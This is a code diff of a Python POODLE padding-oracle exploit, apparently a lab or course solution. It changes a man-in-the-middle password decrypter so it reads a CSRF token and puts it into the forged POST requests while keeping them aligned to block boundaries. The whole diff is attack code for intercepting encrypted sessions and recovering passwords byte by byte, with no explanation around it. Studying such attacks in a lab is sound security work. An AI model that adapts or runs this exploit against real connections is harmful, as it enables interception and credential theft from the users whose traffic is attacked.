@@ -11,7 +11,7 @@ ORIGIN_CLIENT = "C"
 ORIGIN_SEPARATOR = "-"
 RESPONSE_SUCCESSFUL = "ok\n"
 
-PADDING_LAMBDA = 6 # To make request end on block boundary
+PADDING_LAMBDA = 12 # To make request end on block boundary
 
 PADDING_CHAR = "a"
 DECRYPT_BLOCK_FROM_LAST = 4 # Decrypt the 4th block counting from last
@@ -23,18 +23,25 @@ class PoodlePasswordDecrypter:
 		self.got_password = False
 	
 	def run(self):
+		self.read_csrf()
+		self.try_loop()
+		print self.password
+	
+	def read_csrf(self):
+		self.csrf = raw_input()
+	
+	def try_loop(self):
 		padding_chars = 0
 		while not self.got_password:
 			char = self.try_decipher_one_char(padding_chars)
 			if char is not None:
 				self.process_new_char(char)
 				padding_chars += 1
-		print self.password
 	
 	def try_decipher_one_char(self, padding_chars):
 		mitm = MitmConnection()
 		mitm.connect()
-		mitm.send_initial_request(padding_chars)
+		mitm.send_initial_request(padding_chars, self.csrf)
 		mitm.forward_loop()
 		return mitm.decrypted_char
 	
@@ -58,13 +65,13 @@ class MitmConnection:
 		self.rfile = self.socket.makefile('rb', bufsize=-1)
 		self.wfile = self.socket.makefile('wb', bufsize= 0)
 	
-	def send_initial_request(self, num_padding_chars):
+	def send_initial_request(self, num_padding_chars, csrf):
 		body_chars = PADDING_CHAR * num_padding_chars
-		url_chars = PADDING_CHAR * self.__get_num_chars_to_make_request_fill_last_block(num_padding_chars)
-		self.wfile.write('post("/%s", "%s");\n' % (url_chars, body_chars))
+		url_chars = PADDING_CHAR * self.__get_num_chars_to_make_request_fill_last_block(num_padding_chars + len(csrf))
+		self.wfile.write('post("/%s", "csrf=%s&%s");\n' % (url_chars, csrf, body_chars))
 	
-	def __get_num_chars_to_make_request_fill_last_block(self, num_padding_chars):
-		return (BLOCK_LENGTH - ((num_padding_chars + PADDING_LAMBDA) % BLOCK_LENGTH))
+	def __get_num_chars_to_make_request_fill_last_block(self, num_variable_chars):
+		return (BLOCK_LENGTH - ((num_variable_chars + PADDING_LAMBDA) % BLOCK_LENGTH))
 	
 	def forward_loop(self):
 		packet = self.get_mitm_packet()
